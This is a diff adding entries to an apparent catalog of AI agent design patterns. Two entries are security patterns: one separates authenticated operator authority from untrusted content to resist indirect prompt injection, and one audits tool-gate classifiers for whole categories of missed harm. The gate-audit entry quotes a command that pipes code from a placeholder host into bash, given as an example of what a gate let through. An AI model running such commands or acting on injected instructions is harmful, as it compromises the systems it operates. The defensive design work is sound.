@@ -2303,6 +2303,77 @@ graph LR
 
 ---
 
+## Authenticated Authority Channel
+
+**Status:** emerging
+**Category:** Security & Safety
+**Authors:** Austin Bell (@robertaustinbell)
+**Source:** https://arxiv.org/abs/2503.18813
+
+## Problem
+
+Tool-using agents often place operator instructions, standing policy, retrieved documents, webpages, messages, tool output, summaries, and delegated reports in the same model context. Untrusted content can then contain imperative language that resembles a legitimate command. If the runtime does not preserve where each instruction-like statement came from, source content can be mistaken for authorization, persisted as policy, or used to redirect a consequential action.
+
+This is broader than deciding whether a passage is malicious. A benign document can describe a real procedure without authorizing the agent to perform it. The missing distinction is between information that may influence reasoning and input that may grant authority.
+
+## Solution
+
+Maintain a distinguishable **authority channel** throughout the workflow:
+
+- **Control state** contains authenticated current operator intent, explicitly adopted standing policy, and runtime-enforced permissions.
+- **Attributed content** contains external sources, retrieved files, messages under analysis, tool output, model-generated summaries, and delegated reports.
+- Attributed content may supply facts and candidate parameters, but it cannot expand scope, grant permission, alter persistent policy, or authorize execution.
+- A privileged execution point independently validates the proposed operation, target, destination, authority, and arguments against control state before acting.
+- Summarization, compaction, delegation, and persistence must preserve the distinction. If provenance is lost, downgrade to read-only work or request fresh authenticated approval before consequential execution.
+
+```pseudo
+control = load_authenticated_intent_and_policy()
+content = retrieve_with_provenance()
+proposal = reason_over(control.task, content)
+
+if proposal.exceeds(control.authority):
+    request_authenticated_approval(proposal)
+else:
+    executor.validate_and_run(proposal, control, content.provenance)
+```
+
+Labels and prompt delimiters can help the model interpret context, but they are not security boundaries. Back the pattern with scoped credentials, capability controls, egress restrictions, deterministic validation, or isolation proportionate to the downside.
+
+This pattern complements narrower controls in the catalog. Action Selector removes untrusted feedback from a finite control loop; Policy-Gated Tool Proxy and Sandboxed Tool Authorization enforce permissions at the tool boundary; Context Minimization removes tainted material when it is no longer needed; and the Lethal Trifecta reduces dangerous capability combinations. Authenticated Authority Channel instead preserves the authority-versus-content distinction end to end when untrusted material must remain available through retrieval, summarization, compaction, delegation, persistence, and execution.
+
+## Evidence
+
+- **Evidence Grade:** `mixed`
+- **Most Valuable Findings:**
+  - OWASP documents indirect prompt injection through external content and recommends segregating and clearly identifying untrusted content.
+  - CaMeL provides effectiveness evidence for a stronger, narrower architecture that separates trusted control flow from untrusted data and enforces capability policies at tool calls.
+- **Unverified / Unclear:** The cited research does not directly validate this broader end-to-end pattern across retrieval, summarization, compaction, delegation, and persistence. Prompt-level labels alone have not been shown to provide reliable containment, so the behavioral version should not be described as prompt-injection resistance unless the runtime also enforces the boundary.
+
+## How to use it
+
+1. Define which authenticated channel can supply current operator intent. Do not infer authority merely from access to a file, inbox, repository, or tool result.
+2. Attach source type and provenance before external material enters model context. Preserve those labels in summaries and handoffs.
+3. Keep retrieved imperatives attributed to their source. Do not automatically promote them into memory, recurring jobs, configuration, policy, or identity.
+4. Derive candidate actions from the authenticated task while treating source content as evidence and proposed parameters.
+5. At execution time, validate the operation, recipient or target, destination, arguments, scope, and effective permissions independently of free-form source text.
+6. If the runtime cannot reconstruct the authority boundary after compaction or delegation, stop consequential execution, continue read-only analysis, or obtain fresh approval.
+7. Test with matched cases: benign content, a legitimate task-relevant procedure, and an adversarial variant that claims approval or redirects a consequential argument.
+
+## Trade-offs
+
+- **Pros:** Reduces accidental authority laundering; supports flexible reasoning over untrusted content; creates a clear enforcement and audit point; applies where a strict finite action selector is impractical.
+- **Cons:** Requires authenticated intent, provenance-aware context construction, and an independent execution check; labels consume context and may be lost by unsupported runtimes; approval fallbacks can add friction.
+- **Limit:** Provenance establishes attribution, not authenticity or authorization. Control state can be stale, compromised, or bound to the wrong principal. This pattern reduces authority laundering; it does not make an LLM trustworthy, sanitize malicious data, prove source authenticity, or replace technical isolation.
+
+## References
+
+- [OWASP LLM Prompt Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html)
+- Debenedetti et al., [*Defeating Prompt Injections by Design*](https://arxiv.org/abs/2503.18813) — control/data-flow separation and capability enforcement in CaMeL.
+- Beurer-Kellner et al., [*Design Patterns for Securing LLM Agents against Prompt Injections*](https://arxiv.org/abs/2506.08837)
+- [Bobert Agent Template — Untrusted-content execution boundary](https://github.com/robertaustinbell/bobert-agent-template/blob/41f498c3b1292192b7393890940dae9aa1950bd6/RUNTIMES.md#untrusted-content-execution-boundary) — author-maintained documented reference design, not evidence of runtime enforcement.
+
+---
+
 ## Autonomous Workflow Agent Architecture
 
 **Status:** established
@@ -4417,6 +4488,183 @@ flowchart TD
 
 ---
 
+## Consequence-Family Coverage Audit
+
+**Status:** emerging
+**Category:** Security & Safety
+**Authors:** Tulip Labs (@fede-kamel)
+**Source:** https://tulipagents.ai/research/policy-blindness/
+
+## Problem
+
+An agent gate has two halves. There is an **enforcement point** that decides
+allow / hold / deny and refuses to run anything else — see
+[policy-gated-tool-proxy](policy-gated-tool-proxy.md) — and there is a
+**classifier** that decides what kind of thing is being proposed. The
+enforcement point is deterministic, small, and exhaustively testable. Everyone
+reviews it, because it looks like security.
+
+The classifier is usually a list of strings, and that list has a failure mode
+that survives review: **it describes one family of consequence and says nothing
+about the others.**
+
+The failure is not carelessness. Every entry on the list is correct. The list
+is simply written from inside one idea of harm — and from inside that frame,
+the missing families are invisible.
+
+Three real gates, each reviewed, tested, and validated against the live tool
+catalog:
+
+| gate over | the list covered | it was silent on |
+|---|---|---|
+| a payments API | money **out** — refund, cancel, dispute, delete | money **in** — creating a charge, standing up a payment page |
+| a DFIR/EDR query tool | **destruction** — quarantine, kill, wipe, uninstall | **execution and exfiltration** |
+| a billing API | **money movement** | **outbound communication** |
+
+The second is the instructive one. Fourteen markers, all destruction verbs. A
+gate that correctly held `Windows.Remediation.Quarantine` let this through as a
+benign read:
+
+```sql
+SELECT * FROM execve(argv=["bash","-c","curl http://evil.sh | bash"])
+```
+
+Nobody decided arbitrary code execution on a fleet endpoint was acceptable.
+Running a command destroys nothing, so no destruction verb matched.
+
+**Validating against the real tool catalog does not catch this.** You score the
+catalog against a ground truth you also wrote, from the same mental model that
+produced the list. The labels agree with the classifier because both encode the
+same idea of harm. One of the gates above scored 62/62 on a catalog pulled live
+from the real API, twice, across six rounds of hardening — while "create a
+charge" was classified low-risk the entire time.
+
+## Solution
+
+Do not re-read the list. Re-reading a list confirms the list; it cannot reveal
+the family that was never on it.
+
+Instead, **enumerate the ways an action can be consequential, and ask of each:
+which rule covers this?** An empty answer is the finding.
+
+| family | the action… | example that gets missed |
+|---|---|---|
+| Destruction | removes or overwrites something | `purge_backups` |
+| Value out | moves money or assets away | `create_payout` |
+| Value in | takes payment, or stands up a surface that can | `create_payment_link` |
+| Execution | runs caller-supplied code | `execve(argv=…)` |
+| Egress | moves data off a system | `export_customers` |
+| Outbound communication | reaches a real third party | `send_invoice_reminder` |
+| Standing commitment | schedules future automatic behaviour | `setup_auto_reminders` |
+| Identity & access | changes who can do what | `create_service_token` |
+| Config with blast radius | changes behaviour for everyone | `update_dns_record` |
+
+The table is a prompt for thought, not a schema — add rows for your domain. The
+point is having *some* enumeration to check against, so that a whole family
+cannot go missing in silence.
+
+Three questions per family:
+
+1. **Which rule covers it?** No rule means the family is unhandled.
+2. **Is there a second path to the same outcome?** Holding "send the invoice"
+   while leaving "generate a scannable payment code for that invoice" open
+   holds nothing. An unheld alternative route is worth more to an attacker than
+   the route you held.
+3. **Does the caller control the dangerous part?** A tool that shells out
+   internally to read disk usage is a read. A tool that runs a command the
+   caller supplies is not, however similar the names look.
+
+## Evidence
+
+The pattern was derived from three hand-written gates, and then tested against
+a model trained specifically to classify admission decisions — on the theory
+that if the blindness were only an artifact of human authorship, a trained
+model would not reproduce it.
+
+It reproduced. On 8,989 held-out rows the classifier had a **0.74% false-allow
+rate overall**, but the errors were not spread evenly:
+
+| family | risky rows | let through |
+|---|---|---|
+| execution | 165 | **5.45%** |
+| egress | 94 | **5.32%** |
+| standing commitment | 110 | 1.82% |
+| destruction, value-in, outbound | 1,761 | **0.00%** |
+
+Two families carried roughly ten times the error rate of the rest, in a model
+whose largest training source — 17,713 of 38,419 rows — was built explicitly to
+fight this failure.
+
+Seven models were then run on identical rows, including GPT-5 and Claude Opus 5.
+Where the policy states its own rule, every frontier model reached **0.00%
+false-allow**; they are safe on explicit policy and merely over-cautious. The
+useful reading is that explicitness in the policy is doing the work, which is
+the same claim this pattern makes from the other direction.
+
+## How to use it
+
+Run the enumeration as a test, not as a one-off review. A family that is
+genuinely out of scope belongs in an explicit allowlist with a reason beside
+it.
+
+```python
+# One representative action per family. Nothing here is exhaustive on purpose:
+# the value is that adding a family is cheap, so a missing one is a choice.
+FAMILY_PROBES = {
+    "destruction":         "delete_record",
+    "value_out":           "issue_refund",
+    "value_in":            "create_charge",
+    "execution":           "run_script",
+    "egress":              "export_customers",
+    "outbound_comms":      "send_invoice",
+    "standing_commitment": "enable_auto_reminders",
+    "identity_access":     "disable_user",
+}
+
+def uncovered(classify, benign_probe):
+    """Families whose representative action would be auto-allowed.
+
+    `benign_probe` is a call that *should* sail through. It is not optional:
+    a policy that holds everything reports no gaps while telling you nothing,
+    which is the exact false all-clear this pattern is about.
+    """
+    if is_held(classify(benign_probe)):
+        raise AssertionError(
+            f"{benign_probe!r} was held, so this policy holds everything and "
+            "the probe cannot distinguish a covered family from an uncovered one."
+        )
+    return [fam for fam, action in FAMILY_PROBES.items()
+            if not is_held(classify(action))]
+```
+
+Against a classifier matching reversal verbs only — the first failure in the
+table above — this returns six of the eight families.
+
+## Trade-offs
+
+- **Judge a gate by what it lets through, not by what it stops.** Over-caution
+  costs a confirmation prompt; a miss costs the thing you built the gate for.
+  Where a marker cannot be tightened without opening a real path, leave it
+  broad and write the resulting false positives down.
+- **The enumeration is itself a list**, and inherits the same weakness one
+  level up. It is more robust only because families are coarser and fewer than
+  tool names, so an omission is more visible.
+- **Over-holding is a real cost.** A gate that is perfectly safe and stops
+  everything gets switched off within a day, so measure over-hold rate
+  alongside false-allow rate.
+- This does not replace enforcement. It audits the input to enforcement.
+
+## References
+
+- [The family of harm your agent policy cannot see](https://tulipagents.ai/research/policy-blindness/)
+  — the three gates, the measured instance, and the seven-model comparison
+- [Writing a policy that holds](https://tulipagents.ai/concepts/policy-authoring/)
+  — the method with a runnable coverage probe
+- Datasets and eval scripts:
+  [tuliplabs-ai/sdk-python/examples/research](https://github.com/tuliplabs-ai/sdk-python/tree/main/examples/research)
+
+---
+
 ## Context Budget as a Governed Resource
 
 **Status:** validated-in-production
@@ -5457,6 +5705,114 @@ mv memories/.consensus.tmp memories/consensus.md
 
 ---
 
+## Cross-Domain Agent Conflict Resolution
+
+**Status:** emerging
+**Category:** Orchestration & Control
+**Authors:** Narasimhan Ramani (@Narasimhan-Ramani)
+**Source:** https://github.com/open-policy-agent/opa
+
+## Problem
+
+Teams increasingly run several independent, domain-specific agents against the
+same environment or dataset — e.g., a cost-optimization agent, a reliability
+agent, a compliance agent, and a performance agent all assessing the same
+cloud infrastructure. Each agent is individually competent within its domain,
+but none of them are aware the others exist.
+
+This produces silent, unresolved conflicts: one agent recommends deallocating
+an idle resource to save cost, while another recommends adding redundancy to
+the same resource for reliability, and a third recommends scaling it up for
+performance. If recommendations are acted on independently (e.g., via
+auto-remediation), the result is thrashing, wasted work, or actively harmful
+changes — with no record of *why* the conflict happened or *which*
+recommendation should have won.
+
+## Solution
+
+Insert a coordination/governance layer **above** the domain agents that never
+does the domain-specific assessment itself, but instead:
+
+1. **Collects** each domain agent's output as structured findings/
+   recommendations keyed by a shared resource identifier.
+2. **Cross-references** recommendations by resource ID to detect conflicts
+   (a "mesh" evaluation step) and computes a composite priority score per
+   recommendation.
+3. **Resolves** conflicts through policy-as-code (e.g., OPA/Rego, or an
+   embedded rule engine) rather than hardcoded if/else logic, so
+   organizational governance rules (which domain wins, under which
+   conditions) are explicit, versioned, and auditable — falling back to a
+   domain-priority hierarchy or LLM-assisted arbitration only when no policy
+   matches.
+4. **Monitors drift** by comparing each new assessment against a previous
+   baseline, flagging when risk levels, KPIs, or recommendation outcomes
+   change materially over time.
+
+```mermaid
+graph TD
+    A[Domain Agent 1] --> D[Conflict Detector]
+    B[Domain Agent 2] --> D
+    C[Domain Agent N] --> D
+    D --> E[Policy Engine]
+    E -->|policy match| F[Resolved Outcome]
+    E -->|no match| G[Priority Ladder / LLM Arbitration]
+    G --> F
+    F --> H[Drift Monitor vs. Baseline]
+```
+
+## How to use it
+
+**Applicable when:**
+
+- More than one agent (or team) independently assesses/acts on the same
+  resources, dataset, or environment.
+- Conflicting recommendations have real cost if acted on blindly (financial,
+  operational, or compliance risk).
+- You need an auditable record of *why* one recommendation was chosen over
+  another, not just which one "won."
+
+**Implementation considerations:**
+
+- Recommendations need a common resource identifier scheme across all domain
+  agents — without it, conflict detection can't match records at all.
+- Start with a small number of explicit policies covering your highest-risk
+  conflicts (e.g., "reliability protections override cost optimizations for
+  production resources") before trying to cover every case.
+- Keep a fallback resolution path (priority ladder, human escalation, or
+  LLM-assisted arbitration) for conflicts no policy anticipated — don't let
+  the system silently drop unmatched conflicts.
+- The coordination layer should stay domain-agnostic: it should not need code
+  changes to support a new domain agent, only a new policy and a mapping into
+  the shared schema.
+
+## Trade-offs
+
+**Pros:**
+
+- Conflicts become visible and auditable instead of silently overwriting each
+  other or executing in an undefined order.
+- Governance logic lives in versioned, reviewable policy files rather than
+  scattered application code.
+- New domains can be added without changing the arbitration logic, only
+  adding policies/mappings.
+
+**Cons:**
+
+- Adds a coordination hop and latency versus letting each agent act
+  independently.
+- Requires upfront investment in a shared resource-identifier scheme across
+  otherwise-independent agent teams.
+- Policy coverage has to be actively maintained — stale or missing policies
+  fall back to weaker heuristics (priority ladder/LLM), which are less
+  auditable than explicit rules.
+
+## References
+
+- [Open Policy Agent](https://github.com/open-policy-agent/opa) — general-purpose policy-as-code engine for explicit, versioned arbitration rules.
+- [Multi-Criteria Decision Analysis](https://www.gov.uk/government/publications/multi-criteria-analysis-manual-for-making-government-policy) — guidance for making trade-offs among competing objectives explicit and reviewable.
+
+---
+
 ## Cross-Protocol Agent Discovery
 
 **Status:** emerging
@@ -6146,6 +6502,102 @@ graph TD
 - Related: [Human-in-the-Loop Approval Framework](/patterns/human-in-loop-approval-framework) — complementary pattern for initial approval gates
 - Related: [Hook-Based Safety Guard Rails](/patterns/hook-based-safety-guard-rails) — external interceptors that can enforce denial policies
 - Related: [Sandboxed Tool Authorization](/patterns/sandboxed-tool-authorization) — scoped permissions that limit what escalation can grant
+
+---
+
+## Deterministic Grader in the Loop
+
+**Status:** emerging
+**Category:** Feedback Loops
+**Authors:** parweb (@parweb)
+**Source:** https://github.com/parweb/mcp-ai-slop-checker
+
+## Problem
+
+An agent that produces text is routinely asked to judge that text before shipping it: *is this argument sound, is this copy generic, does this read as machine-written?* The default move is to ask a model — LLM-as-judge, or an off-the-shelf classifier.
+
+Both fail the agent in the same specific way: **the verdict is not actionable and not reproducible.**
+
+- A classifier returns `87% likely AI-generated`. There is no next move encoded in that number. The agent's only recourse is to rewrite blindly and re-roll.
+- An LLM judge returns a different score for the same input across runs, and drifts with model versions, so it cannot gate a pipeline or be asserted in a test.
+- Both make an *authorship* claim from *style* evidence, and are wrong in both directions.
+
+The loop stalls because the feedback has no gradient.
+
+## Solution
+
+Put a **deterministic scorer** in the loop instead of a judge. The scorer counts observable, enumerated features and returns **the raw counts alongside each sub-score** — not just the aggregate.
+
+Core properties:
+
+- **Deterministic** — same input, same output, always. No sampling, no model call.
+- **Decomposed** — the aggregate is made of named sub-scores, each traceable to a count.
+- **Local and free** — no API call, so it can run on every iteration without cost or latency pressure.
+- **Honest about what it measures** — it reports a *style* measurement, never an authorship verdict.
+
+The agent loop becomes a hill-climb with an actual gradient:
+
+```pseudo
+draft = generate()
+loop until score >= threshold or budget exhausted:
+    report = score(draft)          // deterministic, decomposed
+    worst  = argmax(report.counts) // e.g. {"hype": 5, "em_dash": 9, "specifics": 0}
+    draft  = revise(draft, target=worst)
+```
+
+```mermaid
+graph TD
+    A[Generate draft] --> B[Deterministic scorer]
+    B --> C{Score >= threshold?}
+    C -- No --> D[Read highest offending count]
+    D --> E[Revise that specific feature]
+    E --> B
+    C -- Yes --> F[Ship / commit]
+```
+
+`"hype": 5` tells the agent to cut five specific words. `87% likely AI` tells it nothing. That difference is the whole pattern.
+
+This is the same shape a coding agent already gets for free from a linter, a type checker, or a failing test — deterministic, decomposed, actionable. The pattern is simply noticing that non-code outputs deserve the same treatment, and that reaching for a model to grade them is usually a downgrade.
+
+## Evidence
+
+- **Evidence Grade:** `low`
+- **Most Valuable Findings:**
+  - Applying one such scorer to a corpus of 239 real product landing pages produced a stable distribution (median 79/100) and surfaced a counter-intuitive dominant feature: **82% (195/239) of hero sections contain no concrete number at all** — while the widely assumed "hype words" tell fired on only 7%, and em-dash density on a similarly small slice. A decomposed scorer finds this; a single opaque probability cannot. Open dataset and method: <https://gist.github.com/parweb/5ed569ba76c365f7b789a979ad6090e7>
+  - The same corpus shows why the *style, not authorship* framing is load-bearing: `stripe.com` scores 61 and was plainly written by professionals. A low score means *reads generic*, never *was generated*.
+- **Unverified / Unclear:** whether closing this loop measurably improves human-judged output quality, or mostly teaches the agent to satisfy the metric (see Goodhart risk below). No controlled comparison against an LLM-judge loop has been run.
+
+## How to use it
+
+1. **Enumerate the features** that make the attribute good or bad, in the narrowest domain you can get away with. This is the real work, and it is domain-specific.
+2. **Write a pure function** from artifact to `{score, sub_scores, counts}`. No network, no model.
+3. **Expose the counts**, not only the total. The counts are the actionable part; the total is only for gating.
+4. **Expose it as a tool** the agent can call mid-task (an MCP server, a CLI, a library function) so the loop closes without a human.
+5. **Gate on it** — because it is deterministic, a threshold can live in a test or a CI check.
+6. **Calibrate against a real corpus** and publish the distribution, so a score has a referent. A bare 0-100 with no baseline is not interpretable.
+
+Good fits: style and readability checks, format and schema conformance, jargon and hedging density, required-element presence, structural repetition. Poor fits: factual accuracy, novelty, and audience appropriateness — keep a model, or a human, for those.
+
+## Trade-offs
+
+**Pros**
+- Reproducible: assertable in tests, usable as a CI gate, comparable across runs and over time.
+- Actionable: names the specific thing to change, giving the revision loop a gradient.
+- Cheap and offline: no token cost or latency, so it can run on every iteration.
+- Auditable: anyone can read the rules and disagree with them explicitly.
+
+**Cons**
+- **Measures only what you thought to count.** Blind to failure modes outside the enumerated feature set.
+- **Goodhart risk is real and direct.** An agent optimising a metric it can read will learn to satisfy the metric. Cap the iterations, and keep the threshold well below the maximum.
+- Requires a calibration corpus to be interpretable, which is upfront work.
+- Says nothing about meaning, truth, or fit for audience — a maximal score can still be worthless prose.
+- Rules need maintenance as conventions shift.
+
+## References
+
+- Reference implementation, MIT, offline, no model call: <https://github.com/parweb/mcp-ai-slop-checker>
+- Calibration corpus — 239 landing pages scored, open CSV plus method: <https://gist.github.com/parweb/5ed569ba76c365f7b789a979ad6090e7>
+- Related in spirit: linters, type checkers and property-based tests as agent feedback — the same deterministic-signal argument, applied to code.
 
 ---
 
@@ -7055,6 +7507,143 @@ Email/calendar assistants, booking agents, API-powered chatbots, or any system h
 
 ---
 
+## Dual-Rail Message Delivery
+
+**Status:** validated-in-production
+**Category:** Orchestration & Control
+**Authors:** Anton Dziatkovskii (@Palo-Alto-AI-Research-Lab)
+**Source:** https://www.cs.utexas.edu/~lorenzo/corsi/cs380d/papers/p225-chandra.pdf
+
+## Problem
+
+Agents running on separate machines coordinate over a single channel: a synced folder, a queue, or a chat. That channel eventually fails, and it fails *quietly*.
+
+The damage is not the outage itself, it is the ambiguity it creates. A dead channel and an idle channel produce exactly the same observation: nothing arrives. The sender's log says "sent" and stops there. The receiver has nothing to report, because it never learned a message existed. No exception is raised, no retry fires, and the fleet keeps behaving as if silence meant agreement. Outages are typically discovered hours later, by a human noticing that something downstream never happened.
+
+Two properties make this failure mode expensive:
+
+1. **"Sent" is not "delivered", and "delivered" is not "done"** — but a single channel collapses all three into one unobservable event.
+2. **Machine-to-machine traffic is invisible to humans**, so the people who could intervene are the last to find out.
+
+Retries do not fix this. Retrying on a dead rail produces more silence.
+
+This is the practical face of a classical result: in an asynchronous system you cannot distinguish a crashed participant from a slow one by observing messages alone (Chandra & Toueg, 1996). A second, independently failing channel supplies another observation. When a message appears on one rail but not the other, that divergence localizes a rail failure. When neither rail delivers or acknowledges a message, silence is still ambiguous: the peer may be slow or unavailable, or both rails may have failed. Timeouts and escalation remain necessary for that case.
+
+## Solution
+
+Send every message on **two independent rails at once**, and make sending on only one rail *unrepresentable* rather than merely discouraged.
+
+**The two rails:**
+
+- **Rail A — a file mailbox** on a synced folder (Syncthing, Dropbox, git). Works offline, carries large payloads, survives outages of the chat provider.
+- **Rail B — a group chat** (Telegram, Slack, Discord) that both the machines *and the humans* read. Survives sync-link outages, and makes traffic human-visible at zero extra cost.
+
+**The four mechanisms that make it work:**
+
+1. **One entry point.** All sends go through a single function that has no parameter for choosing a rail. There is no API through which a single-rail send can be expressed. This matters more than documenting the rule: before the single entry point existed, ad-hoc single-rail sends kept reappearing in our own code.
+2. **A dead rail is a signal, not a silent downgrade.** If one rail fails, the message still lands via the other, *and* a degradation alert fires. Delivery and health are decoupled.
+3. **Divergence is a diagnosis.** A message present on rail B but absent on rail A localises the fault to rail A within one polling interval, instead of leaving you with a fleet-wide "something is wrong".
+4. **ACK discipline on top.** The receiver replies with `ACK <msg-id>`. The sender owns the *result*, not the handoff: silence past an SLA triggers a chase, then escalation to a human. This is what separates "delivered" from "done".
+
+The rails must fail *independently*. Two cloud APIs behind the same network path are one rail wearing two hats. A local file-sync plus a hosted chat API is a good pair, because their failure modes rarely overlap.
+
+Payload policy is part of a common envelope. Both rails carry the same inline-safe payload or the same opaque reference plus integrity digest. Sensitive payloads use an encrypted envelope or a capability/reference that is safe on both rails. If no safe common representation exists, this pattern does not apply to that message.
+
+```pseudo
+send(msg):
+    envelope = common_envelope(msg)         # inline-safe, referenced, or encrypted
+    id = stable_id(envelope)                # SAME id on both rails enables deduplication
+    a  = try(file_rail.append(id, envelope))
+    b  = try(chat_rail.post(id, envelope))
+
+    if not (a or b): raise HardFailure      # both rails dead => fail loudly, never silently
+    if not a: alert("rail A degraded")      # partial delivery still succeeded,
+    if not b: alert("rail B degraded")      # but health is reported separately
+    ledger.record(id, sent_on=[a, b], acked=False)
+
+receive():
+    for id, envelope in dedupe_by_id(file_rail.poll() + chat_rail.poll()):
+        msg = resolve_and_verify(envelope)
+        handle_once(id, msg)                # handler MUST be idempotent: both copies may arrive
+        send_ack(id)                        # through the same dual-rail entry point
+
+chase():                                    # "sent" is not "done"
+    for id in ledger.unacked_past_sla():
+        reping(id) or escalate_to_human(id)
+```
+
+```mermaid
+graph TD
+    S[Agent on machine A] -->|single entry point| E{bus_send}
+    E --> R1[Rail A: file mailbox on synced folder]
+    E --> R2[Rail B: group chat]
+    R1 --> D[Dedup by stable message id]
+    R2 --> D
+    R2 -.human-readable.-> H[Humans watching the same chat]
+    D --> X[Agent on machine B: handle + ACK]
+    X -->|ACK msg-id| L[Ledger: delivered vs done]
+    L -->|silence past SLA| C[Chase, then escalate]
+```
+
+## Evidence
+
+- **Evidence Grade:** `medium`
+- **Most Valuable Findings:**
+  - Across ~2 months of daily operation on a 5-machine fleet, every observed coordination outage was a *silent single-channel failure*, not a message-content failure. The second rail converted those outages from "discovered hours later by a human" into an alert within one polling interval.
+  - Enforcing the invariant at the API level (no way to name a rail) proved more durable than enforcing it by convention. Convention decayed; the missing parameter did not.
+  - Because rail B is a chat that humans already read, humans twice noticed a stalled machine before any watchdog did — the human-visibility side effect was not the design goal but turned out to be a real detector.
+- **Unverified / Unclear:**
+  - Single production deployment (n=1 operation). No controlled comparison against a single-rail baseline, so the size of the improvement is not quantified — only its direction.
+  - Untested at high volume. Our traffic is dozens of messages per day; the cost of unconditional duplicate delivery at thousands per day is unknown.
+  - No data on whether three or more rails ever pay for themselves.
+
+## How to use it
+
+**Use it when:**
+
+- Two or more agents run on separate machines, networks, or operators' laptops.
+- Silence is ambiguous in your system — that is, an agent staying quiet could plausibly mean either "nothing to do" or "I never got it".
+- You want humans to be able to watch the fleet without building a dashboard for it.
+
+**Prerequisites:**
+
+- **Stable message ids.** The receiver *will* get both copies; without a deterministic id, dedup is impossible.
+- **Idempotent handlers.** Assume every message is delivered at least twice. Design for at-least-once, not exactly-once.
+- **A ledger with two separate columns**, `delivered` and `acked`. Merging them re-creates the original problem in a new place.
+
+**Do not use it when:** agents share a process or a single machine. There the channel is not the weak point, and a plain queue is the simpler correct answer.
+
+## Trade-offs
+
+**Pros**
+
+- Single-rail failure becomes observable when rails diverge; simultaneous silence still requires timeout and escalation.
+- Degraded operation still delivers — one rail down is a warning, not an outage.
+- Rail divergence localizes the failed path within the monitoring interval.
+- Human visibility comes free, because one rail is a chat people already read.
+
+**Cons**
+
+- Every message is duplicated. A receiver that does not dedupe will double-execute — this pattern *requires* idempotency, it does not grant it.
+- Two integrations to build and keep alive, and the health of each must be monitored separately.
+- Large payloads must be externalized to access-controlled storage; both rails carry the same opaque reference and integrity digest.
+- Secrets require an encrypted envelope or a capability/reference safe for both rails. Never silently downgrade a message to one rail; if no safe common envelope exists, use a different delivery design.
+
+## References
+
+- Chandra, T. D., & Toueg, S. (1996). [Unreliable Failure Detectors for Reliable Distributed Systems](https://www.cs.utexas.edu/~lorenzo/corsi/cs380d/papers/p225-chandra.pdf). *Journal of the ACM*, 43(2), 225–267. — why silence is undecidable with a single source of evidence, and what an extra detector buys you.
+- Helland, P. (2012). [Idempotence Is Not a Medical Condition](https://queue.acm.org/detail.cfm?id=2187821). *ACM Queue*, 10(4). — the at-least-once contract this pattern forces on receivers: duplicate delivery is the price of the second rail.
+- Dean, J., & Barroso, L. A. (2013). [The Tail at Scale](https://cacm.acm.org/research/the-tail-at-scale/). *CACM*, 56(2), 74–80. — the same "issue the request twice over independent paths" move, applied there to latency rather than to fault detection.
+- [RFC 8684](https://datatracker.ietf.org/doc/html/rfc8684): TCP Extensions for Multipath Operation with Multiple Addresses (2020). — the transport-layer precedent for running one logical stream over multiple disjoint paths for resilience to path failure.
+
+**Implementation note (author affiliation: I maintain the repository below).**
+
+- [claude-consensus](https://github.com/Palo-Alto-AI-Research-Lab/claude-consensus) — the reference implementation the evidence in this entry comes from: the bus, the ACK discipline, and the consensus protocol built on top of it.
+- [FAILURE-MODES.md](https://github.com/Palo-Alto-AI-Research-Lab/claude-consensus/blob/main/docs/FAILURE-MODES.md) — nine production failure modes, each of which occurred before the guard that now prevents it.
+- [EVALS.md](https://github.com/Palo-Alto-AI-Research-Lab/claude-consensus/blob/main/docs/EVALS.md) — the offline, zero-token evaluation harness and its measured output.
+
+---
+
 ## Dual-Use Tool Design
 
 **Status:** best-practice
@@ -7471,6 +8060,146 @@ Design memory writes as structured records (decision, evidence, outcome, confide
 - Windsurf Memories docs
 
 - Primary source: https://forum.cursor.com/t/agentic-memory-management-for-cursor/78021
+
+---
+
+## Evidence-Layered Evaluation for Interactive Agents
+
+**Status:** emerging
+**Category:** Reliability & Eval
+**Authors:** Yuxuan Zhang (@reacher-z)
+**Source:** https://github.com/TIGER-AI-Lab/ClawBench
+
+## Problem
+
+Interactive agents can reach the wrong outcome for many different reasons: a bad plan, an incorrect click, a transient site response, or an evaluator that cannot observe the relevant state. A single success/failure score hides these causes and makes regressions difficult to reproduce, especially when tasks run on live websites or desktop applications.
+
+## Solution
+
+Capture evaluation evidence in layers, while keeping the task outcome as the primary decision signal. A run records (1) the final-state or request-level assertion, (2) the ordered actions taken, (3) screenshots or other visual state, (4) a session replay when timing matters, (5) network requests when the browser state is not sufficient, and (6) the agent messages that led to each action. A verifier can then report the outcome and link it to the smallest evidence layer that explains the result.
+
+A practical pipeline is:
+
+```text
+task + policy -> isolated run -> action/visual/network/message capture
+                              |
+                              v
+                         outcome verifier
+                              |
+                     score + evidence bundle
+```
+
+The layers should be timestamped and correlated by run ID. Collectors may be disabled for privacy-sensitive tasks, but the evaluator should state which layers were available rather than silently treating missing evidence as a successful run.
+
+## Evidence
+
+- **Evidence Grade:** `medium`
+- **Most Valuable Findings:** Separate evidence layers support diagnosis of planning, interaction, and environment failures; request-level assertions can verify state transitions that are not visually exposed; replayable bundles make human adjudication and regression analysis practical.
+- **Unverified / Unclear:** The relative value of each layer depends on the task and site; no universal layer ordering or storage budget has been established.
+
+## How to use it
+
+1. Define a task-level success assertion before running the agent, such as a state change or intercepted request.
+2. Run the agent in an isolated browser or desktop environment and attach a stable run identifier to every event.
+3. Record actions and agent messages by default; add screenshots, video, and network capture when they answer a known observability gap.
+4. Evaluate the assertion first, then use the evidence bundle to classify failures and adjudicate ambiguous outcomes.
+5. Retain a compact manifest with timestamps, harness/model versions, task version, and enabled evidence layers so another evaluator can reproduce the comparison.
+
+## Trade-offs
+
+- **Pros:** More actionable failure analysis; easier regression triage; supports both automated verification and human review; makes claims about live-task performance auditable.
+- **Cons/Considerations:** Storage and instrumentation overhead increase with each layer; network and message logs can contain sensitive data; clock drift and incomplete capture can complicate correlation; richer evidence does not guarantee a correct evaluator.
+
+## References
+
+- [ClawBench](https://github.com/TIGER-AI-Lab/ClawBench) — an example implementation of layered evidence capture for live-web agent evaluation (contributor-maintained; cited as an implementation, not as a normative standard).
+- [BrowserGym](https://github.com/ServiceNow/BrowserGym) — web-agent environments and evaluation tooling.
+- [WebArena](https://github.com/web-arena-x/webarena) — realistic web environments for autonomous-agent evaluation.
+
+---
+
+## Exact-Action Authorization Binding
+
+**Status:** proposed
+**Category:** Security & Safety
+**Authors:** Austin Bell (@robertaustinbell)
+**Source:** https://datatracker.ietf.org/doc/html/draft-toraman-noa-action-digest-01
+
+## Problem
+
